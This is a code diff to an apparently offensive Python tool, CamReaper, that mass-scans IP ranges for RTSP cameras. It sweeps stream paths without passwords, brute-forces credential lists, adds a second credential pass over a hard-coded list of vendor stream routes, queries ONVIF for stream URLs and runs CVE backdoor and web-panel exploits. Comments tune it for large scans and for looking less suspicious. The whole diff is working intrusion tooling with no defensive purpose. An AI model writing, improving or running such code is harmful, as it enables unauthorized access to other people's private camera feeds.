@@ -40,8 +40,8 @@ MAX_TRANSPORT_FAILS = 2
 
 # Ports of one host probed at the same time.  Most targets in a large scan are
 # dead, and probing the ports one after another costs timeout-per-port per
-# host; 4 keeps the socket count sane while cutting that wait ~4x.
-PORT_PARALLEL = 4
+# host; 8 keeps the socket count sane while cutting that wait ~8x.
+PORT_PARALLEL = 8
 
 AUTH_CODES = {"401", "403"}
 
@@ -61,6 +61,44 @@ AUTH_CODES = {"401", "403"}
 # as the walk proceeds, because each answer proves the host is alive - a hang
 # burst late in a long walk is far less suspicious than one at its very start.
 _MUTE_EVIDENCE = 4
+
+# Routes worth one extra credential attempt after the normal "/" pass failed.
+# Many cameras answer 401 to *every* path, including a correct password on "/"
+# (the root is simply not a playable resource), and only return 200 on the one
+# real stream path.  The old loop stopped at the first 401 and never tried the
+# password on those routes, so such a camera was reported as "no auth".
+#
+# The list is deliberately short: it is the second pass, run only for hosts
+# that actually challenged us, and the per-host wall-clock budget still caps it.
+DEEP_AUTH_ROUTES = (
+    "/stream1",
+    "/live",
+    "/live.sdp",
+    "/h264/ch1/main/av_stream",
+    "/h264/ch1/sub/av_stream",
+    "/Streaming/Channels/101",
+    "/Streaming/Channels/101/",
+    "/Streaming/Channels/102",
+    "/Streaming/Channels/102/",
+    "/cam/realmonitor?channel=1&subtype=0",
+    "/cam/realmonitor?channel=1&subtype=1",
+    "/cam/realmonitor?channel=1&subtype=1&unicast=true&proto=Onvif",
+    "/main/av_stream",
+    "/sub/av_stream",
+    "/videoMain",
+    "/videoSub",
+    "/axis-media/media.amp",
+    "/onvif1",
+    "/onvif2",
+    "/media/video1",
+    "/1",
+    "/11",
+    "/12",
+    "/mpeg4",
+    "/s1",
+    "/0/1:1/main",
+    "/user=admin&password=&channel=1&stream=0.sdp?",
+)
 
 
 class _FailureBudget:
@@ -137,9 +175,21 @@ class Settings:
     screenshot_timeout: float = 10.0
     max_attempts: int = 0
     max_transport_fails: int = 2
+    # Second credential pass over stream routes.  Cameras that answer 401 even
+    # for a correct password on "/" are only reachable this way.
+    deep_auth: bool = True
+    deep_auth_routes: int = 40
     attempts_per_sec: float = 0.0
     host_timeout: float = 0.0  # 0 = unlimited; wall-clock cap for one host
     route_parallel: int = 8  # 0 = serial
+    port_parallel: int = PORT_PARALLEL  # port probes of one IP at once
+    port_pipeline_parallel: int = 8  # live ports of one IP processed at once
+    # --profile fast keeps the old "first responsive port wins" behaviour and
+    # the old 404 rules; balanced/max process every port and treat any RTSP
+    # status as a live host.
+    all_ports: bool = True
+    any_status_live: bool = True
+    retry_after_404: bool = True
     status_interval: float = 5.0  # seconds between live status callbacks
     mode: str = "brute"  # "brute" | "cve" | "combined"
     cve_db: object = None  # CVEDatabase instance or None
@@ -265,6 +315,7 @@ async def _sweep_routes(
     ip: str, port: int, timeout: float, routes, cred: str, parallel: int,
     deadline=None, first_only: bool = True,
     max_transport_fails: int = MAX_TRANSPORT_FAILS,
+    auth_source=None,
 ) -> list:
     """Probe ``routes`` in parallel stripes; return the routes that answered 200.
 
@@ -288,6 +339,8 @@ async def _sweep_routes(
 
     async def _stripe(stripe_routes):
         client = RTSPClient(ip, port, timeout, ":")
+        if auth_source is not None:
+            client.adopt_auth(auth_source)
         budget = _FailureBudget(max_transport_fails)
         try:
             for route in stripe_routes:
@@ -357,6 +410,7 @@ async def _probe_routes(
     hits = await _sweep_routes(
         client.ip, client.port, client.timeout, routes, cred, route_parallel,
         deadline, first_only=True, max_transport_fails=max_transport_fails,
+        auth_source=client,
     )
     return hits[0] if hits else None
 
@@ -365,6 +419,7 @@ async def probe_first_open_route(
     ip: str, port: int, timeout: float, routes, cred: str = ":",
     parallel: int = 0, deadline=None,
     max_transport_fails: int = MAX_TRANSPORT_FAILS,
+    auth_source=None,
 ):
     """Return the first of ``routes`` that answers 200 on ``ip:port`` (or None).
 
@@ -374,6 +429,8 @@ async def probe_first_open_route(
     """
     if parallel <= 1:
         client = RTSPClient(ip, port, timeout, ":")
+        if auth_source is not None:
+            client.adopt_auth(auth_source)
         try:
             if not await client.connect(port):
                 return None
@@ -384,7 +441,7 @@ async def probe_first_open_route(
             client.close()
     hits = await _sweep_routes(
         ip, port, timeout, routes, cred, parallel, deadline, first_only=True,
-        max_transport_fails=max_transport_fails,
+        max_transport_fails=max_transport_fails, auth_source=auth_source,
     )
     return hits[0] if hits else None
 
@@ -408,8 +465,66 @@ async def probe_all_routes(
         return []
     return await _sweep_routes(
         client.ip, client.port, client.timeout, routes, creds,
-        max(1, route_parallel), first_only=False,
+        max(1, route_parallel), first_only=False, auth_source=client,
     )
+
+
+def _deep_route_list(s: Settings) -> list:
+    """Bounded set of stream paths for the second credential pass."""
+    out: list = []
+    seen: set = set()
+    limit = max(1, int(s.deep_auth_routes))
+    # Curated broad-coverage routes first: the built-in default list covers
+    # every vendor, and a long community wordlist would otherwise fill the
+    # budget with Dahua channel paths before Hikvision/Axis/ONVIF are reached.
+    for route in list(DEEP_AUTH_ROUTES) + list(s.routes):
+        # "/" was already tried with every credential in the first pass; the
+        # second pass exists for the other stream paths.
+        if not route or route == "/" or route in seen:
+            continue
+        seen.add(route)
+        out.append(route)
+        if len(out) >= limit:
+            break
+    return out
+
+
+async def _deep_auth_sweep(
+    ip: str, port: int, s: Settings, deadline=None, auth_source=None,
+):
+    """Try every credential against a short list of real stream routes.
+
+    Returns ``(credential, route)`` or ``None``.  Only called after the normal
+    "/" pass saw at least one authentication challenge, so a host that is mute
+    or plainly closed never pays for it.
+    """
+    routes = _deep_route_list(s)
+    if not routes or not s.credentials:
+        return None
+    loop = asyncio.get_running_loop()
+    interval = 1.0 / s.attempts_per_sec if s.attempts_per_sec > 0 else 0.0
+    for cred in s.credentials:
+        if deadline is not None and loop.time() >= deadline:
+            return None
+        route = await probe_first_open_route(
+            ip,
+            port,
+            s.timeout,
+            routes,
+            cred,
+            parallel=max(1, s.route_parallel),
+            deadline=deadline,
+            max_transport_fails=s.max_transport_fails,
+            auth_source=auth_source,
+        )
+        if route:
+            return cred, route
+        if interval:
+            now = loop.time()
+            if deadline is not None and now >= deadline:
+                return None
+            await asyncio.sleep(interval)
+    return None
 
 
 def _failure_reason(client: RTSPClient, code: str) -> str:
@@ -423,7 +538,9 @@ def _failure_reason(client: RTSPClient, code: str) -> str:
     return client.last_error or "no-response"
 
 
-async def _probe_port(ip: str, port: int, timeout: float):
+async def _probe_port(
+    ip: str, port: int, timeout: float, any_status_live: bool = True,
+):
     """Classify one RTSP port of a host.
 
     Returns ``(state, client, vendor)`` where ``state`` is one of:
@@ -431,7 +548,9 @@ async def _probe_port(ip: str, port: int, timeout: float):
       * ``unconfirmed`` - the socket opened but no valid RTSP answer arrived;
       * ``open``        - no credentials needed and ``/`` is confirmed;
       * ``gate``        - 200 on a dummy route but ``/`` is gated;
-      * ``auth``        - answered 401/403, i.e. it wants credentials.
+      * ``auth``        - answered 401/403, i.e. it wants credentials;
+      * ``live``        - answered some other real RTSP status (404, 400,
+                         405, ...), so the host is alive and must be swept.
     """
     client = RTSPClient(ip, port, timeout, ":")
     if not await client.connect(port):
@@ -454,6 +573,13 @@ async def _probe_port(ip: str, port: int, timeout: float):
         return "gate", client, detect_vendor(client.data)
     if code in AUTH_CODES:
         return "auth", client, detect_vendor(client.data)
+    if code and any_status_live:
+        # Any other real RTSP status line proves this is an RTSP server.  A
+        # lot of cameras answer an unknown path with 404 (or 400/405/461)
+        # instead of a 401 challenge; treating that as "unconfirmed" and
+        # dropping the host skipped every open stream on it.  The route sweep
+        # below is exactly what finds those streams.
+        return "live", client, detect_vendor(client.data)
     return "unconfirmed", client, ""
 
 
@@ -475,7 +601,9 @@ async def _probe_ports(ip: str, s: Settings, deadline=None) -> list:
     if len(ports) == 1:
         if deadline is not None and loop.time() >= deadline:
             return []
-        state, client, vendor = await _probe_port(ip, ports[0], s.timeout)
+        state, client, vendor = await _probe_port(
+            ip, ports[0], s.timeout, s.any_status_live
+        )
         return [(0, state, client, vendor)]
 
     results: dict = {}
@@ -490,9 +618,11 @@ async def _probe_ports(ip: str, s: Settings, deadline=None) -> list:
             cursor = index + 1
             if deadline is not None and loop.time() >= deadline:
                 return
-            results[index] = await _probe_port(ip, ports[index], s.timeout)
+            results[index] = await _probe_port(
+                ip, ports[index], s.timeout, s.any_status_live
+            )
 
-    workers = min(PORT_PARALLEL, len(ports))
+    workers = min(max(1, int(s.port_parallel)), len(ports))
     await asyncio.gather(
         *(asyncio.create_task(_worker()) for _ in range(workers))
     )
@@ -503,157 +633,169 @@ async def _probe_ports(ip: str, s: Settings, deadline=None) -> list:
     ]
 
 
-async def _handle_host(ip: str, s: Settings, stats: dict = None) -> list:
-    """Run the full pipeline for one IP.  Returns a list of Found streams.
+async def _tcp_open(ip: str, port: int, timeout: float) -> bool:
+    """Cheap TCP liveness check used to gate optional HTTP/ONVIF probing."""
+    writer = None
+    try:
+        await ratelimit.acquire()
+        _reader, writer = await asyncio.wait_for(
+            asyncio.open_connection(ip, port), timeout=timeout
+        )
+        return True
+    except (asyncio.TimeoutError, OSError):
+        return False
+    except Exception:
+        return False
+    finally:
+        if writer is not None:
+            try:
+                writer.close()
+                await writer.wait_closed()
+            except Exception:
+                pass
 
-    ``stats`` (optional) is a mutable dict mutated in place for counters that
-    machinery outside ``_guard`` needs to update (cve_tested, http_checked).
+
+async def _open_ports(ip: str, ports, timeout: float) -> list:
+    """Return the subset of ``ports`` that accepts a TCP connection."""
+    ports = list(ports)
+    if not ports:
+        return []
+    results = await asyncio.gather(
+        *(_tcp_open(ip, port, timeout) for port in ports),
+        return_exceptions=True,
+    )
+    return [
+        port for port, ok in zip(ports, results) if ok is True
+    ]
+
+
+async def _discover_onvif(
+    ip: str,
+    vendor: str,
+    s: Settings,
+    stats: dict = None,
+    require_open_port: bool = True,
+) -> list:
+    """Ask an ONVIF device for its exact stream URLs and verify every one.
+
+    This is deliberately independent of the RTSP port scan: ONVIF lives on an
+    HTTP port (often 80/8080/34567), and a camera whose RTSP port is not in the
+    user's ``-p`` list still hands out a perfectly good ``rtsp://`` URL.  The
+    old pipeline only ran ONVIF *after* an RTSP port had already answered, so
+    those devices were invisible.
+
+    ``require_open_port`` adds a fast TCP gate for hosts with no known live
+    RTSP port: a dead host costs one short connect per ONVIF port instead of a
+    full SOAP timeout on each.
+    """
+    if not s.onvif:
+        return []
+
+    from CamReaper.onvif import ONVIF_PORTS, discover, parse_stream_uri
+
+    ports = list(s.onvif_ports) if s.onvif_ports else list(ONVIF_PORTS)
+    if require_open_port:
+        gate_timeout = min(max(0.4, s.timeout), 1.5)
+        ports = await _open_ports(ip, ports, gate_timeout)
+        if not ports:
+            return []
+
+    try:
+        res = await discover(
+            ip,
+            ports=ports,
+            timeout=s.onvif_timeout,
+            creds=s.onvif_creds or None,
+            max_profiles=s.onvif_profiles,
+            # A single test server can host several independent ONVIF services
+            # on different ports; collect all of them, not just the first.
+            first_only=False,
+        )
+    except Exception:
+        return []
+
+    found = []
+    seen = set()
+    for stream in (res.streams if res else []):
+        parsed = parse_stream_uri(stream.uri, stream.credentials)
+        if not parsed:
+            continue
+        _host, dport, droute = parsed
+        key = (dport, droute, stream.credentials)
+        if key in seen:
+            continue
+        seen.add(key)
+        # The device said this URI is a stream; confirm it over RTSP before
+        # reporting it, so a stale/disabled profile cannot pad the report.
+        if not await _verify_stream(
+            ip, dport, droute, stream.credentials, s.timeout
+        ):
+            continue
+        found.append(Found(ip, dport, droute, stream.credentials, vendor))
+        if stats is not None:
+            stats["onvif_found"] = stats.get("onvif_found", 0) + 1
+    return found
+
+
+async def _handle_live_port(
+    ip: str,
+    live: RTSPClient,
+    vendor: str,
+    s: Settings,
+    stats: dict = None,
+    deadline=None,
+    onvif_state: dict = None,
+) -> list:
+    """Run the route/ONVIF/CVE/brute pipeline for one responsive RTSP port.
+
+    The caller owns ``live`` and closes it.  ``onvif_state`` is shared across
+    every port of the same host: ONVIF discovery is host-wide (it asks the HTTP
+    service, not the RTSP port), so it is attempted once and not repeated for
+    each port the host exposes.
     """
     found: list = []
 
-    # A pathological camera (accepts the port but stalls mid-brute) must not
-    # occupy its host slot for ~one timeout per credential.  The wall-clock
-    # budget covers the WHOLE pipeline, starting with port probing - it used to
-    # start only after a live port was found, so a host with many configured
-    # ports could burn the budget before the deadline even existed.
-    loop = asyncio.get_running_loop()
-    deadline = loop.time() + s.host_timeout if s.host_timeout > 0 else None
-
-    # ---- stage 1: find a live port that "responds" (200/401/403) ----
-    # Ports are probed concurrently and then judged in the order the user asked
-    # for them, so the winner never depends on which answer came back first.
-    results = await _probe_ports(ip, s, deadline)
-    live: RTSPClient = None
-    vendor = "Generic"
-    open_port = None  # (client, vendor) for a passwordless confirmed stream
-    winner = -1
-    for index, state, client, port_vendor in results:
-        if state == "open":
-            winner, open_port = index, (client, port_vendor or "Generic")
-            break
-        if state in ("auth", "gate"):
-            winner, live, vendor = index, client, port_vendor or "Generic"
-            break
-        if state == "unconfirmed":
-            # Port was open (TCP established) but no valid RTSP response came
-            # back - a reachable-but-unconfirmed host.  Only these are logged,
-            # and only when the user opted in via --failed-file.
-            await record_failed(
-                ip, client.port,
-                _failure_reason(client, "") if s.failed_with_error else "",
-            )
-        client.close()
-    # Release the sockets of the ports that lost the race.
-    for index, _state, client, _vendor in results:
-        if index != winner:
-            client.close()
-
-    if open_port is not None:
-        found.append(Found(ip, open_port[0].port, "/", ":", open_port[1]))
-        open_port[0].close()
-        return found
-
-    if live is None:
-        # Port probing may already have consumed the whole host budget.
-        if deadline is not None and loop.time() >= deadline:
-            return found
-        # No live RTSP port.  In 'cve'/'combined' mode, fall back to probing
-        # the configured HTTP/HTTPS ports for CVE exploits on the device's web
-        # panel (e.g. Hikvision/Dahua config disclosure, RCE endpoints).
-        # Skipped when the user disabled HTTP probing, or no CVE db is loaded.
-        if (
-            not s.no_http
-            and s.mode in ("cve", "combined")
-            and s.cve_db
-            and s.http_ports
-        ):
-            from CamReaper.cve import probe_http_host
-
-            # Probe the web-panel ports concurrently.  Serially, a host with no
-            # live RTSP port cost one full timeout *per HTTP port* back to back,
-            # which made --mode cve many times slower than --mode brute on the
-            # same target list - even though the ports are independent.
-            async def _probe_http(hport):
-                return await probe_http_host(
-                    ip, hport, s.cve_db, s.http_timeout, stats
-                )
-
-            for found_here in await asyncio.gather(
-                *(_probe_http(hp) for hp in s.http_ports),
-                return_exceptions=True,
-            ):
-                if isinstance(found_here, BaseException):
-                    continue
-                found.extend(found_here or ())
-        return found
-
     # ---- stage 2: find a route that works without credentials ----
-    # Sweep the FULL route list without credentials.
-    # Many cameras (e.g. Hikvision) answer 200 on a specific query route such
-    # as "/cam/realmonitor?channel=1&subtype=1&unicast=true&proto=Onvif" while
+    # Sweep the FULL route list without credentials.  Many cameras (e.g.
+    # Hikvision) answer 200 on a specific query route such as
+    # "/cam/realmonitor?channel=1&subtype=1&unicast=true&proto=Onvif" while
     # returning 401 on the common ones - they are "open" but only on that route.
     # Skipping this sweep means finding fewer cameras: such a host would
     # otherwise drop straight into credential bruting, fail, and be reported
     # as not found although no password was ever needed.
-    #
-    # The sweep is still bounded: a per-host wall-clock deadline caps the total
-    # work, and a host that stalls at the transport level (timeout / socket
-    # dropped mid-request) is abandoned after a couple of failures so a silent
-    # camera doesn't grind the whole route list.
     route = await _probe_routes(
         live, ["/"] + list(s.routes), ":", s.route_parallel, deadline,
         s.max_transport_fails,
     )
     if route:
         found.append(Found(ip, live.port, route, ":", vendor))
-        live.close()
         return found
 
-    # ---- stage 2.5: ONVIF stream discovery ----
-    if deadline is not None and loop.time() >= deadline:
-        live.close()
+    # ---- stage 2.5: ONVIF stream discovery (once per host) ----
+    if deadline is not None and asyncio.get_running_loop().time() >= deadline:
         return found
-
-    # Only reached when the cheap RTSP route sweep came up empty, so the fast
-    # path (a camera that answers "/" straight away) pays nothing for it.  ONVIF
-    # runs over HTTP on its own port and needs no guessing, so a device found
-    # here is a *stream*, not a lead.
-    if s.onvif:
-        from CamReaper.onvif import discover, parse_stream_uri
-
-        try:
-            res = await discover(
-                ip,
-                ports=s.onvif_ports or None,
-                timeout=s.onvif_timeout,
-                creds=s.onvif_creds or None,
-                max_profiles=s.onvif_profiles,
-            )
-        except Exception:
-            res = None
-        for st in (res.streams if res else []):
-            parsed = parse_stream_uri(st.uri, st.credentials)
-            if not parsed:
-                continue
-            _host, dport, droute = parsed
-            # The device said this URI is a stream; confirm it over RTSP before
-            # reporting it, so a device that hands out a stale or profile-only
-            # URL cannot pad the report with results that do not play.
-            if not await _verify_stream(ip, dport, droute, st.credentials, s.timeout):
-                continue
-            found.append(Found(ip, dport, droute, st.credentials, vendor))
-            if stats is not None:
-                stats["onvif_found"] = stats.get("onvif_found", 0) + 1
-            live.close()
-            return found
+    if s.onvif and onvif_state is not None:
+        should_discover = False
+        lock = onvif_state.get("lock")
+        if lock is not None:
+            async with lock:
+                if not onvif_state.get("tried"):
+                    onvif_state["tried"] = True
+                    should_discover = True
+        elif not onvif_state.get("tried"):
+            onvif_state["tried"] = True
+            should_discover = True
+        if should_discover:
+            found.extend(await _discover_onvif(ip, vendor, s, stats))
+            if found:
+                return found
 
     # ---- stage 3: CVE exploits (vendor-specific backdoors & HTTP probes) ----
-    if deadline is not None and loop.time() >= deadline:
-        live.close()
+    if deadline is not None and asyncio.get_running_loop().time() >= deadline:
         return found
     # "Generic" is no longer excluded: the CVE database ships a shared
-    # factory-default credential list for unidentified devices, and the vendor-
-    # specific http_probe entries are harmless to try against any web panel.
+    # factory-default credential list for unidentified devices, and the
+    # vendor-specific http_probe entries are harmless to try against any panel.
     if s.mode in ("cve", "combined") and s.cve_db:
         from CamReaper.cve import run_cve_stage
 
@@ -671,29 +813,29 @@ async def _handle_host(ip: str, s: Settings, stats: dict = None) -> list:
                 continue
             stats["cve_found"] = stats.get("cve_found", 0) + 1
         if any(not f.is_http_cve for f in cve_found):
-            # A confirmed RTSP stream from a backdoor credential: the host is
+            # A confirmed RTSP stream from a backdoor credential: this port is
             # done.  HTTP-only hits deliberately fall through to stage 4, so a
             # vulnerable web panel never suppresses the brute-force of a host
             # that also answers RTSP.
-            live.close()
             return found
 
     # ---- stage 4: brute-force credentials ----
     if s.mode == "cve":
         # CVE-only mode: skip brute-force entirely.
-        live.close()
         if not found:
             await record_no_auth(ip, live.port)
         return found
     attempts = 0
     transport_fails = 0
     need_fresh = False
+    saw_auth = False
+    transport_gave_up = False
     next_allowed = 0.0
     interval = 1.0 / s.attempts_per_sec if s.attempts_per_sec > 0 else 0.0
     for cred in s.credentials:
         if s.max_attempts and attempts >= s.max_attempts:
             break
-        if deadline is not None and loop.time() >= deadline:
+        if deadline is not None and asyncio.get_running_loop().time() >= deadline:
             break
         if need_fresh or not live.is_connected:
             if need_fresh:
@@ -705,30 +847,40 @@ async def _handle_host(ip: str, s: Settings, stats: dict = None) -> list:
             need_fresh = False
         attempts += 1
         if interval:
-            now = loop.time()
+            now = asyncio.get_running_loop().time()
             if now < next_allowed:
                 await asyncio.sleep(next_allowed - now)
             next_allowed = max(now, next_allowed) + interval
-        code, live_ok = await try_auth(live, cred, "/")
+        code, _live_ok = await try_auth(live, cred, "/")
         if code == "200":
             found.append(Found(ip, live.port, "/", cred, vendor))
-            live.close()
             return found
         if code == "404":
-            # Credentials are valid, route is wrong - sweep routes for a 200.
-            good = await _probe_routes(live, s.routes, cred, s.route_parallel, deadline,
-                                       s.max_transport_fails)
+            # Usually valid credentials on a path that is not a stream, so
+            # sweep routes for a 200.  But some firmware answers 404 instead of
+            # 401 for a *rejected* login too, so a failed sweep must not end
+            # the credential loop - a later credential can still be the right
+            # one.
+            good = await _probe_routes(
+                live, s.routes, cred, s.route_parallel, deadline,
+                s.max_transport_fails,
+            )
             if good:
                 found.append(Found(ip, live.port, good, cred, vendor))
-                live.close()
                 return found
-            # Valid creds but no working route -> NOT a confirmed stream.
-            live.close()
-            return found
+            if not s.retry_after_404:
+                # --profile fast: keep the old "404 means the credential was
+                # accepted but the route is wrong" shortcut.
+                return found
+            saw_auth = True
+            transport_fails = 0
+            need_fresh = True
+            continue
         if code in AUTH_CODES:
             # Clean 401/403 - next credential goes on a fresh connection, since
             # some cameras start refusing valid credentials mid-session after a
             # burst of 401s on the same socket.
+            saw_auth = True
             transport_fails = 0
             need_fresh = True
         elif _is_mute_host(live, code):
@@ -738,6 +890,7 @@ async def _handle_host(ip: str, s: Settings, stats: dict = None) -> list:
             # cameras do that and the next credential legitimately reconnects.)
             transport_fails += 1
             if transport_fails >= s.max_transport_fails:
+                transport_gave_up = True
                 break
         elif code:
             # A real status code (404 handled above, 4xx/5xx here): the unit is
@@ -751,14 +904,204 @@ async def _handle_host(ip: str, s: Settings, stats: dict = None) -> list:
             # every 401 looks like, and bailing out here loses the whole list.
             need_fresh = True
 
-    live.close()
     if not found:
+        # Second pass: a camera that answers 401 even to a correct password on
+        # "/" only opens on its real stream path.  Run it only for hosts that
+        # actually challenged us (a mute/closed host would just burn time) and
+        # only when the user did not explicitly cap attempts to dodge a lockout.
+        if (
+            s.deep_auth
+            and saw_auth
+            and not transport_gave_up
+            and not s.max_attempts
+        ):
+            hit = await _deep_auth_sweep(
+                ip, live.port, s, deadline, auth_source=live
+            )
+            if hit:
+                cred, route = hit
+                found.append(Found(ip, live.port, route, cred, vendor))
+                return found
         # A live RTSP port was confirmed (it challenged us with 401/403) but no
-        # open route and no credential in the list opened a stream.  Only the
-        # user opted in via --no-auth-file is this recorded; these are few
+        # open route and no credential in the list opened a stream.  Only when
+        # the user opted in via --no-auth-file is this recorded; these are few
         # (real, confirmed cameras we couldn't open), not the closed ports.
         await record_no_auth(ip, live.port)
     return found
+
+
+def _dedupe_found(found: list) -> list:
+    """Drop identical stream rows discovered through two different stages."""
+    out: list = []
+    seen: set = set()
+    for item in found:
+        key = (
+            item.port,
+            item.route,
+            item.credentials,
+            item.is_http_cve,
+            item.cve_id,
+        )
+        if key in seen:
+            continue
+        seen.add(key)
+        out.append(item)
+    return out
+
+
+async def _handle_host(ip: str, s: Settings, stats: dict = None) -> list:
+    """Run the full pipeline for one IP.  Returns a list of Found streams.
+
+    Every responsive RTSP port is processed, not just the first one: a test
+    server (or a DVR/NVR management box) can expose many cameras on different
+    ports of the same address, and the old "first responsive port wins" rule
+    reported exactly one of them.
+
+    ``stats`` (optional) is a mutable dict mutated in place for counters that
+    machinery outside ``_guard`` needs to update (cve_tested, http_checked).
+    """
+    found: list = []
+
+    # A pathological camera (accepts the port but stalls mid-brute) must not
+    # occupy its host slot for ~one timeout per credential.  The wall-clock
+    # budget covers the WHOLE pipeline, starting with port probing.
+    loop = asyncio.get_running_loop()
+    deadline = loop.time() + s.host_timeout if s.host_timeout > 0 else None
+
+    # ---- stage 1: find every live port that speaks RTSP ----
+    # A live port is one that returns *any* real RTSP status: 200 (open),
+    # 401/403 (auth), or 404/400/405/... (the camera is talking, the path is
+    # wrong).  Ports are probed concurrently and then judged in the order the
+    # user asked for them.
+    results = await _probe_ports(ip, s, deadline)
+    open_clients = []
+    candidates = []
+    for _index, state, client, port_vendor in results:
+        vendor = port_vendor or "Generic"
+        if state == "open":
+            open_clients.append((client, vendor))
+        elif state in ("auth", "gate", "live"):
+            candidates.append((client, vendor))
+        elif state == "unconfirmed":
+            # Port was open (TCP established) but no valid RTSP response came
+            # back - a reachable-but-unconfirmed host.  Only these are logged,
+            # and only when the user opted in via --failed-file.
+            await record_failed(
+                ip, client.port,
+                _failure_reason(client, "") if s.failed_with_error else "",
+            )
+            client.close()
+        else:
+            client.close()
+
+    if not s.all_ports:
+        # --profile fast: the original "first responsive port wins" rule.  An
+        # open port ends the host immediately; otherwise only the first
+        # auth/gate/live candidate is processed.
+        if open_clients:
+            client, vendor = open_clients[0]
+            found.append(Found(ip, client.port, "/", ":", vendor))
+            client.close()
+            for extra, _vendor in open_clients[1:]:
+                extra.close()
+            for extra, _vendor in candidates:
+                extra.close()
+            return _dedupe_found(found)
+        if candidates:
+            for extra, _vendor in candidates[1:]:
+                extra.close()
+            candidates = candidates[:1]
+
+    # Passwordless streams are confirmed the moment the port is classified.
+    for client, vendor in open_clients:
+        found.append(Found(ip, client.port, "/", ":", vendor))
+        client.close()
+
+    # No RTSP port at all: ONVIF lives on an HTTP port and can still identify
+    # the device, so ask it before giving up on the host.
+    if not candidates:
+        if deadline is None or loop.time() < deadline:
+            if s.onvif:
+                found.extend(
+                    await _discover_onvif(
+                        ip, "Generic", s, stats, require_open_port=True
+                    )
+                )
+            if (
+                not found
+                and not s.no_http
+                and s.mode in ("cve", "combined")
+                and s.cve_db
+                and s.http_ports
+            ):
+                from CamReaper.cve import probe_http_host
+
+                async def _probe_http(hport):
+                    return await probe_http_host(
+                        ip, hport, s.cve_db, s.http_timeout, stats
+                    )
+
+                for found_here in await asyncio.gather(
+                    *(_probe_http(hp) for hp in s.http_ports),
+                    return_exceptions=True,
+                ):
+                    if isinstance(found_here, BaseException):
+                        continue
+                    found.extend(found_here or ())
+        return _dedupe_found(found)
+
+    # ONVIF is host-wide, so attempt it at most once across all ports.
+    onvif_state = {"tried": False, "lock": asyncio.Lock()}
+    # A management box can answer on dozens of ports; run a bounded number of
+    # port pipelines at once so one multi-port host still uses the available
+    # concurrency instead of walking its ports one by one.
+    limit = max(1, int(getattr(s, "port_pipeline_parallel", 8)))
+    sem = asyncio.Semaphore(limit)
+
+    async def _one(client, vendor):
+        async with sem:
+            if deadline is not None and loop.time() >= deadline:
+                client.close()
+                return []
+            try:
+                return await _handle_live_port(
+                    ip, client, vendor, s, stats, deadline, onvif_state
+                )
+            finally:
+                client.close()
+
+    batches = await asyncio.gather(
+        *(_one(client, vendor) for client, vendor in candidates),
+        return_exceptions=True,
+    )
+    for got in batches:
+        if isinstance(got, BaseException):
+            # A failure on one port must not hide the cameras on the others,
+            # but it still has to stay visible in the summary.
+            if stats is not None:
+                stats["errors"] = stats.get("errors", 0) + 1
+                if len(stats.get("error_samples", ())) < 5:
+                    stats.setdefault("error_samples", []).append(
+                        f"{ip}: {type(got).__name__}: {got}"
+                    )
+            continue
+        found.extend(got)
+
+    # If every live RTSP port already had an open route, the ONVIF stage never
+    # ran.  A multi-service test server can still expose an additional camera
+    # through ONVIF, so ask once per host.  The TCP gate makes this cheap for
+    # ordinary cameras (one short connect per ONVIF port).
+    if (
+        s.onvif
+        and not onvif_state.get("tried")
+        and (deadline is None or loop.time() < deadline)
+    ):
+        host_vendor = next(
+            (vendor for _client, vendor in candidates if vendor != "Generic"),
+            "Generic",
+        )
+        found.extend(await _discover_onvif(ip, host_vendor, s, stats))
+    return _dedupe_found(found)
 
 
 async def _screenshot_worker(queue: asyncio.Queue, s: Settings, counter: dict):
